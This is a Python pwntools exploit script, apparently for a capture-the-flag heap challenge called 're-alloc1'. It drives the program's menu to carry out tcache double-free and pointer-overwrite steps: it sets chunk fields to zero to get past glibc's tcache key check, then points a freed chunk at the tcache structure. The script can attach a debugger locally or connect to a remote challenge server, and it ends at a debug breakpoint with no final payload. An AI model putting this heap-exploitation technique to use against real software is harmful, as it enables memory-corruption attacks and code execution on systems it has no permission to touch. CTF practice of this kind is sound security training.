#! /usr/bin/env python3
from pwn import *

def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('Your choice: ')

def malloc(idx, size, content):
    eat()
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Size:')
    p.send(str(size))
    p.recvuntil('Data:')
    p.send(content)

def realloc(idx, size, content):
    eat()
    p.sendline('2')
    p.recvuntil('Index:')
    p.send(str(idx))
    p.recvuntil('Size:')
    p.send(str(size))
    p.recvuntil('Data:')
    p.send(content)

def realloc_0(idx):
    eat()
    p.sendline('2')
    p.recvuntil('Index:')
    p.send(str(idx))
    p.recvuntil('Size:')
    p.send(str(0))

def delete(idx):
    eat()
    p.sendline('3')
    p.recvuntil('Index:')
    p.send(str(idx))


while True:
    try:
        arch = 64
        challenge = './re-alloc1'

        context.os = 'linux'
        context.log_level = 'debug'
        if arch == 64:
            context.arch = 'amd64'
        if arch == 32:
            context.arch = 'i386'
        context.terminal = ['tmux', 'splitw', '-h']
        elf = ELF(challenge)
        libc = ELF('libc.so')

        local = 1
        if local:
            p = process(challenge)
        else:
            p = remote('chuj.top', '53178')

        tcache = 0x4010
        malloc(0, 0x70, '\n')
        realloc(0, 0x50, '\n')
        realloc(0, 0x10, '\n')
        delete(0)
        malloc(0, 0x30, '\n')

        realloc_0(0)# size 0x40

        for i in range(6):
            realloc(0, 0x30, p64(0) + p64(0))# size 0x40 bk = 0 bypass key
            realloc_0(0)

        realloc(0, 0x30, p16(tcache))

        

        debug()

    except EOFError:
        # p.close()
        continue
    else:
        p.interactive()
        break


